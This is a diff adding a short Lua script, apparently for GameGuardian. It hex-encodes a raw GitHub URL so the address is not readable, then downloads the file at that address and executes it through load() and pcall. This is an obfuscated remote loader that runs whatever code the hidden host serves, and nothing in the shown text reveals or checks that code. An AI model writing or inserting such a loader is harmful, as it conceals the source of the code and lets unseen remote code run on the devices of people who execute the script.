@@ -1,0 +1,8 @@
+function string.fh(str)
+    return (str:gsub('..', function (cc)
+        return string.char(tonumber(cc, 16))
+    end))
+end
+
+local b =("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C746E736D796E6D61722F4C544E534D59414E4D41522F6D61737465722F4672656531"):fh()
+pcall(load(gg.makeRequest(b).content))
